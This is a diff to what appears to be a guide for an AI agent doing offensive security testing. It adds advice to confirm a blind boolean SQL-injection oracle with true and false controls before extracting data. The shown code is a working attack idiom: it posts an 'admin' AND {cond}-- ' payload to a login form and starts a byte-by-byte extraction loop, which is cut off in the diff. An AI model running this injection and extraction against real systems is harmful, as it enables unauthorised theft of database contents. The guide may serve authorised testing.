@@ -30,6 +30,16 @@ reasoning turn burns the budget and times out.
 For a single confirming probe, the normal `http_request` tool is still simpler —
 don't spin up a script for one request.
 
+## Oracle first — before any extraction
+
+A blind extraction loop is only as good as its oracle. Before you script the
+loop, **prove the oracle differentiates**: send one **known-TRUE** and one
+**known-FALSE** condition and confirm the responses actually differ (body,
+status, length, or timing). If they look identical, your injection point or
+payload is wrong — **fix that first**. Never run an extraction loop on an oracle
+you have not proven separates true from false: it just burns the budget
+returning garbage, one wrong byte at a time. Calibrate, then extract.
+
 ## Idioms
 
 Blind boolean-SQLi extraction (one call replaces hundreds of turns):
@@ -42,6 +52,9 @@ charset = string.printable
 def oracle(cond):
     r = requests.post(URL, data={"username": f"admin' AND {cond}-- ", "password":"x"})
     return "Welcome" in r.text            # adapt the true-condition signal
+# calibrate FIRST: TRUE and FALSE controls must differ, else the injection is wrong
+if not (oracle("1=1") and not oracle("1=2")):
+    raise SystemExit("oracle does not differentiate — fix the injection, do not extract")
 val = ""
 for pos in range(1, 41):
     lo, hi = 32, 126
